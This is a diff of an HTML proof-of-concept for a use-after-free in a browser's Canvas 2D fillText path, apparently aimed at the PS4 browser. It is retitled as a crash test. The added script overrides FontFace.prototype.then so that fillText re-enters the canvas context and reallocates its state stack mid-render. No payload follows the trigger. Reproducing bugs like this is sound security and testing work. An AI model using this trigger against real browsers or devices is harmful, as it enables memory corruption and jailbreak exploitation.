@@ -1,30 +1,62 @@
+<!-- Adaptado para exercitar o caminho do fillText no CanvasRenderingContext2D -->
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>PoC - PS4 fillText / drawTextInternal UAF</title>
+  <meta charset="utf-8">
+  <title>Canvas 2D fillText Font Metrics UAF Test</title>
 </head>
 <body>
-<script>
-    console.log("FontFace:", typeof FontFace);
-console.log("document.fonts:", !!document.fonts);
+  <p>This test passes if it does not crash.</p>
 
-const canvas = document.createElement("canvas");
-const ctx = canvas.getContext("2d");
+  <script>
 
-console.log("Canvas 2D:", !!ctx);
+    // 1. Registra a fonte customizada baseada no objeto FontFace
+    let face = new FontFace('MyTestFam', 'local(Helvetica)');
+    face.loaded.catch(() => {});
+    document.fonts.add(face);
 
-if (ctx) {
-    ctx.font = "10px sans-serif";
+    // 2. Obtém o contexto 2D do Canvas padrão
+    let canvas = document.createElement('canvas');
+    let context = canvas.getContext('2d');
 
-    try {
-        ctx.fillText("\u13A0\u13A2\u13A4", 10, 10);
-        console.log("fillText executado");
-    } catch (error) {
-        console.log("Erro:", String(error));
-    }
-}
-</script>
+    context.save();
+    context.lineWidth = 0.5;
+
+    // Define a fonte que acionará a resolução assíncrona/cache
+    context.font = '10px MyTestFam';
+
+    // 3. Intercepta o resolver de Promises (then) para forçar a reentrância
+    let reentered = false;
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get() {
+        if (reentered)
+          return undefined;
+
+        reentered = true;
+
+        // Reentrância: Realoca a pilha de estados (m_stateStack) na heap
+        // enquanto o processo interno de renderização/métricas do texto está em andamento.
+        for (let i = 0; i < 25; i++) {
+          context.save();
+          context.lineWidth = 1 + i;
+        }
+
+        reentered = false;
+
+        return function(resolve) {
+          if (typeof resolve === 'function') resolve();
+        };
+      }
+    });
+
+    // 4. Executa o fillText() com uma string mais longa/mista para forçar
+    // o percurso completo de glifos (WidthIterator) e disparar o uso das FontMetrics pós-width()
+    context.fillText('a_Test_String_12345_!@#$', 10, 50);
+
+    // Finalização do ciclo de teste
+    setTimeout(() => {
+    }, 200);
+  </script>
 </body>
 </html>
-
